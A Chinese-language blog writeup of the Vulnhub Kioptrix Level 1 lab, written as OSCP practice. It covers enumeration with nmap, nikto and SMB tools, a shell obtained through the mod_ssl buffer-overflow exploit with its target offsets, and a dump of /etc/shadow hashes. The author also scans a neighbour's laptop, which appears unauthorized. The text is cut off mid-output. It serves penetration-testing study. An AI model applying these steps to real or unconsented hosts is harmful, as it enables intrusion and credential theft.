<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> OSCP:Vulnhub Kioptrix Level 1 Writeup · TonghuaRoot's BloG. - Cyber security enthusiast, not Hacker.</title><meta name="description" content="OSCP:Vulnhub Kioptrix Level 1 Writeup - TonghuaRoot"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://tonghuaroot.com/atom.xml" title="TonghuaRoot's BloG. - Cyber security enthusiast, not Hacker."></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://twitter.com/tonghuaroot" target="_blank" class="nav-list-link">TWITTE</a></li><li class="nav-list-item"><a href="https://github.com/tonghuaroot" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRS</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">OSCP:Vulnhub Kioptrix Level 1 Writeup</h1><div class="post-info">Oct 13, 2019</div><div class="post-content"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>准备写一个撸Vulnhub的系列教程，从Kioptrix系列开始，相关链接在这里：<a href="https://www.vulnhub.com/series/kioptrix,8/" target="_blank" rel="noopener">https://www.vulnhub.com/series/kioptrix,8/</a>，这篇文章先从<a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/" target="_blank" rel="noopener">Kioptrix: Level 1 (#1)</a>开始了。</p>
<p>OSCP的在线lab太卡了，先做Vulnhub上头的镜像练手。</p>
<h2 id="0x01-渗透思路"><a href="#0x01-渗透思路" class="headerlink" title="0x01 渗透思路"></a>0x01 渗透思路</h2><p>常规思路，两个入口，扫描服务，识别版本，上exploit code梭哈。</p>
<ul>
<li>Apache mod_ssl 2.8.4 Remote Buffer Overflow</li>
<li>Samba 2.2.1a Remote Code Execution</li>
</ul>
<h2 id="0x02-用到的工具"><a href="#0x02-用到的工具" class="headerlink" title="0x02 用到的工具"></a>0x02 用到的工具</h2><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br><span class="line">nmap</span><br><span class="line">DirBuster</span><br><span class="line">wordlists</span><br><span class="line">rpcclient</span><br><span class="line">smbclient</span><br><span class="line">enum4linux</span><br><span class="line">nikto</span><br><span class="line">searchsploit</span><br><span class="line">metasploit</span><br></pre></td></tr></table></figure>
<h3 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h3><ul>
<li><a href="https://www.exploit-db.com/exploits/10" target="_blank" rel="noopener">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution</a></li>
<li><a href="https://www.exploit-db.com/exploits/47080" target="_blank" rel="noopener">Apache mod_ssl &lt; 2.8.7 OpenSSL - ‘OpenFuckV2.c’ Remote Buffer Overflow (2)</a></li>
</ul>
<h2 id="0x03-渗透过程"><a href="#0x03-渗透过程" class="headerlink" title="0x03 渗透过程"></a>0x03 渗透过程</h2><p>靶机起来大概长这样：</p>
<p><img src="71707904C61C482A989528E3ADC3D4B8" alt="image"></p>
<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>netdiscover内网主机发现，原理就是ARP扫描，拿到内网IP。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure>
<p><img src="8E46EECC67BA4640AD32064F48D4B8EC" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Currently scanning: 172.16.180.0/16   |   Screen View: Unique Hosts            </span><br><span class="line">                                                                               </span><br><span class="line">5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300                </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.199.1   d4:ee:07:59:a6:ec      2     120  HIWIFI Co., Ltd.             </span><br><span class="line">192.168.199.126 90:f0:52:68:7a:ac      1      60  MEIZU Technology Co., Ltd.   </span><br><span class="line">192.168.199.219 98:22:ef:fc:5c:13      1      60  Liteon Technology Corporation</span><br><span class="line">192.168.199.230 00:0c:29:7c:3a:16      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure>
<p>192.168.199.1是路由器，192.168.199.126是邻居的手机，192.168.199.219不知道是个啥，回头再看(emm,namp扫了下好像是邻居的笔记本)，所以此次的目标就是192.168.199.230了。</p>
<p>nmap走一波:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sV -T4 -A -oX Kioptrix_level_1.xml 192.168.199.230</span><br><span class="line">nmap -p- -sV -T4 -Pn  -oG Kioptrix_level_1.txt  192.168.199.219 | grep &quot;open&quot;</span><br></pre></td></tr></table></figure>
<p>参数解读：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p &lt;port ranges&gt;: Only scan specified ports，-p-就是扫描1-65535全端口</span><br><span class="line">-sV: Probe open ports to determine service/version info</span><br><span class="line">-T[0-6]: Set timing template (higher is faster)，控制扫描速度啥的</span><br><span class="line">-A: Enables OS detection and Version detection</span><br><span class="line">-oN/-oX/-oS/-oG &lt;file&gt;: Output scan results in normal, XML, s|&lt;rIpt kIddi3,and Grepable format, respectively, to the given filename. ，-oX就是输出xml格式后面跟文名</span><br><span class="line">-Pn 不ping了，直接扫，避免有的机器禁ping而扫不到</span><br></pre></td></tr></table></figure>
<p><img src="6EEEA0C9CA744151BFE87847AE3932B1" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -p- -sV -T4 -A -oX Kioptrix_level_1.xml 192.168.199.230</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-13 03:46 EDT</span><br><span class="line">Nmap scan report for 192.168.199.230</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65529 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">|_ssl-date: 2019-10-13T07:49:52+00:00; +1m50s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:7C:3A:16 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1m49s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.09 ms 192.168.199.230</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 133.02 seconds</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure>
<ul>
<li>22是SSH端口</li>
<li>80、443是Web端口</li>
<li>111是RPC service</li>
<li>139是Samba</li>
<li>1024也是RPC service</li>
</ul>
<h3 id="Apache-mod-ssl-2-8-4-Remote-Buffer-Overflow"><a href="#Apache-mod-ssl-2-8-4-Remote-Buffer-Overflow" class="headerlink" title="Apache mod_ssl 2.8.4 Remote Buffer Overflow"></a>Apache mod_ssl 2.8.4 Remote Buffer Overflow</h3><p>Web目录爆破的字典在这个目录下(也可以用wordlists去翻，这个工具会把常用的字典软链接到/usr/share/wordlists)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/dirbuster/wordlists# ls</span><br><span class="line">apache-user-enum-1.0.txt  directory-list-2.3-medium.txt</span><br><span class="line">apache-user-enum-2.0.txt  directory-list-2.3-small.txt</span><br><span class="line">directories.jbrofuzz      directory-list-lowercase-2.3-medium.txt</span><br><span class="line">directory-list-1.0.txt    directory-list-lowercase-2.3-small.txt</span><br><span class="line">root@kali:/usr/share/dirbuster/wordlists# pwd</span><br><span class="line">/usr/share/dirbuster/wordlists</span><br></pre></td></tr></table></figure>
<p>nikto扫下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nikto -host 192.168.199.230 -port 80</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.199.230</span><br><span class="line">+ Target Hostname:    192.168.199.230</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2019-10-13 05:30:31 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span><br><span class="line">+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.</span><br><span class="line">+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header</span><br><span class="line">+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</span><br><span class="line">+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</span><br><span class="line">+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</span><br><span class="line">+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE </span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ ///etc/hosts: The server install allows reading of any system file by adding an extra &apos;/&apos; to the URL.</span><br><span class="line">+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).</span><br><span class="line">+ OSVDB-3268: /manual/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /manual/: Web server manual found.</span><br><span class="line">+ OSVDB-3268: /icons/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ OSVDB-3092: /test.php: This might be interesting...</span><br><span class="line">+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.</span><br><span class="line">+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.</span><br><span class="line">+ /shell?cat+/etc/hosts: A backdoor was identified.</span><br><span class="line">+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host</span><br><span class="line">+ End Time:           2019-10-13 05:30:56 (GMT-4) (25 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
<p>定位到漏洞：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</span><br></pre></td></tr></table></figure>
<p>基于CVE编号，搜到<a href="https://www.exploit-db.com/exploits/764" target="_blank" rel="noopener">Apache mod_ssl &lt; 2.8.7 OpenSSL - ‘OpenFuckV2.c’ Remote Buffer Overflow (1)</a>，searchsploit mod_ssl可以看到kali上存的利用代码：</p>
<p><img src="4B0E1B8148984280BA397FE3A9CDB6BA" alt="image"></p>
<p><img src="D42C0CAE62F54884BCB674D3529D5E2B" alt="image"></p>
<p>expoloit比较老了，要装libssl1.0-dev才能编译成功，hhh</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libssl1.0-dev</span><br></pre></td></tr></table></figure>
<p>然后报了更多的错误，大雾。。</p>
<p><img src="67548AA04EB44EBDB03415216EF449D3" alt="image"></p>
<p>好在找到了一篇文章，提出了解决方法：<a href="https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/" target="_blank" rel="noopener">Compiling exploit 764.c in 2017 (using libssl-dev 1.1.0f )</a>，嗯又报错了，最后换<a href="https://www.exploit-db.com/exploits/47080" target="_blank" rel="noopener">Apache mod_ssl &lt; 2.8.7 OpenSSL - ‘OpenFuckV2.c’ Remote Buffer Overflow (2)</a>弹回shell了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/exploitdb/exploits/unix/remote# ./47080 | grep 1.3.20</span><br><span class="line">	0x02 - Cobalt Sun 6.0 (apache-1.3.20)</span><br><span class="line">	0x27 - FreeBSD (apache-1.3.20)</span><br><span class="line">	0x28 - FreeBSD (apache-1.3.20)</span><br><span class="line">	0x29 - FreeBSD (apache-1.3.20+2.8.4)</span><br><span class="line">	0x2a - FreeBSD (apache-1.3.20_1)</span><br><span class="line">	0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)</span><br><span class="line">	0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)</span><br><span class="line">	0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)</span><br><span class="line">	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</span><br><span class="line">	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</span><br><span class="line">	0x7e - Slackware Linux 8.0 (apache-1.3.20)</span><br><span class="line">	0x86 - SuSE Linux 7.3 (apache-1.3.20)</span><br><span class="line">root@kali:/usr/share/exploitdb/exploits/unix/remote#</span><br></pre></td></tr></table></figure>
<p>基于nmap的扫描版本1.3.20，以及系统为redhat可以定位到为0x6a、0x6b两个参数，用了0x6b可以成功利用。</p>
<p><img src="666CCFEC91294074AB84974D9606D3FE" alt="image"></p>
<p>Capturing The Flag!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/mail/root</span><br></pre></td></tr></table></figure>
<p><img src="6F1F635589A24C54B83DFDC6AF5BF9B7" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br><span class="line">root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::</span><br><span class="line">bin:*:14513:0:99999:7:::</span><br><span class="line">daemon:*:14513:0:99999:7:::</span><br><span class="line">adm:*:14513:0:99999:7:::</span><br><span class="line">lp:*:14513:0:99999:7:::</span><br><span class="line">sync:*:14513:0:99999:7:::</span><br><span class="line">shutdown:*:14513:0:99999:7:::</span><br><span class="line">halt:*:14513:0:99999:7:::</span><br><span class="line">mail:*:14513:0:99999:7:::</span><br><span class="line">news:*:14513:0:99999:7:::</span><br><span class="line">uucp:*:14513:0:99999:7:::</span><br><span class="line">operator:*:14513:0:99999:7:::</span><br><span class="line">games:*:14513:0:99999:7:::</span><br><span class="line">gopher:*:14513:0:99999:7:::</span><br><span class="line">ftp:*:14513:0:99999:7:::</span><br><span class="line">nobody:*:14513:0:99999:7:::</span><br><span class="line">mailnull:!!:14513:0:99999:7:::</span><br><span class="line">rpm:!!:14513:0:99999:7:::</span><br><span class="line">xfs:!!:14513:0:99999:7:::</span><br><span class="line">rpc:!!:14513:0:99999:7:::</span><br><span class="line">rpcuser:!!:14513:0:99999:7:::</span><br><span class="line">nfsnobody:!!:14513:0:99999:7:::</span><br><span class="line">nscd:!!:14513:0:99999:7:::</span><br><span class="line">ident:!!:14513:0:99999:7:::</span><br><span class="line">radvd:!!:14513:0:99999:7:::</span><br><span class="line">postgres:!!:14513:0:99999:7:::</span><br><span class="line">apache:!!:14513:0:99999:7:::</span><br><span class="line">squid:!!:14513:0:99999:7:::</span><br><span class="line">pcap:!!:14513:0:99999:7:::</span><br><span class="line">john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::</span><br><span class="line">harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::</span><br></pre></td></tr></table></figure>
<h3 id="Samba-2-2-1a-Remote-Code-Execution"><a href="#Samba-2-2-1a-Remote-Code-Execution" class="headerlink" title="Samba 2.2.1a Remote Code Execution"></a>Samba 2.2.1a Remote Code Execution</h3><p>nbtscan扫一下139的samba服务,rpcclient,smbclient空口令连接：</p>
<p><img src="5F4679C8484844C394A86E792DDB7BD5" alt="image"></p>
<p><img src="BFA36B1CE7DB4301AB73985784B7B11D" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nbtscan 192.168.199.230</span><br><span class="line">Doing NBT name scan for addresses from 192.168.199.230</span><br><span class="line"></span><br><span class="line">IP address       NetBIOS Name     Server    User             MAC address      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">192.168.199.230  KIOPTRIX         &lt;server&gt;  KIOPTRIX         00:00:00:00:00:00</span><br><span class="line">root@kali:~# </span><br><span class="line"></span><br><span class="line">root@kali:~# rpcclient -U &quot;&quot; 192.168.199.230</span><br><span class="line"></span><br><span class="line">root@kali:~# smbclient -L=&quot;192.168.199.230&quot;</span><br><span class="line">Server does not support EXTENDED_SECURITY  but &apos;client use spnego = yes&apos; and &apos;client ntlmv2 auth = yes&apos; is set</span><br><span class="line">Anonymous login successful</span><br><span class="line">Enter WORKGROUP\root&apos;s password: </span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	IPC$            IPC       IPC Service (Samba Server)</span><br><span class="line">	ADMIN$          IPC       IPC Service (Samba Server)</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">Server does not support EXTENDED_SECURITY  but &apos;client use spnego = yes&apos; and &apos;client ntlmv2 auth = yes&apos; is set</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">	Server               Comment</span><br><span class="line">	---------            -------</span><br><span class="line">	KIOPTRIX             Samba Server</span><br><span class="line"></span><br><span class="line">	Workgroup            Master</span><br><span class="line">	---------            -------</span><br><span class="line">	MYGROUP              KIOPTRIX</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure>
<p>enum4linux</p>
<p><img src="9BCE63D411204A218C577F81F0645F36" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 